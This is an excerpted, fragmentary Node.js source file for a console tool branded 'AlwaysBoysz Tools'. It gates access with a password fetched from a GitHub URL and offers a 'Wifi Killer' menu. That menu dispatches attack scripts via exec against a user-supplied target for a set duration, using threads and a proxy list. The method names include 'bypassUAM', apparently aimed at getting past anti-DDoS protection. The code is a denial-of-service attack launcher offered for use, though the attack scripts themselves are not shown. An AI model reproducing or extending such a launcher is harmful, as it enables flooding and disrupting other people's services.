...
async function bootup() {
  try {
    ...
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/AlwaysBoyszz/Boysz/refs/heads/main/ngeri.txt');
    const password = await secretBangetJir.text();
    await console.log(`Login Key Required`)
    permen.question('[\x1b[1m\x1b[31mAlwaysBoysz Security\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        ...
        await sleep(700)
        console.clear()
        console.log(`Welcome To AlwaysBoysz Tools ${version}`)
        await sleep(1000)
		    await banner()
...
Type exit To Stop
`);
permen.question('[\x1b[1m\x1b[31mAlwaysBoysz Wifi Killer\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
   ...
   exec(`node ${metode} ${target} ${duration}`)
    ...
    sigma()
      ...
      sigma()
       ...
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 30 proxy.txt`)
          } else if (methods === 'skibidi') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 30 proxy.txt`)
          } else if (methods === 'MakLu') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 30 proxy.txt`)
          } else if (methods === 'bypassUAM') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 30 proxy.txt`)
          } else if (methods === 'MIX1') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 30 proxy.txt`)
...
permen.question('[\x1b[1m\x1b[31mAlwaysBoysz Chat AI\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
...
Created And Coded Full By AlwaysBoysz
...
Allah SWT
`
permen.question('[\x1b[1m\x1b[32mAlwaysBoysz Console\x1b[0m]: \n', (input) => {
...
${creatorCredits}`);
    ...
    console.log(`AlwaysBoysz Ai Ragbot Started
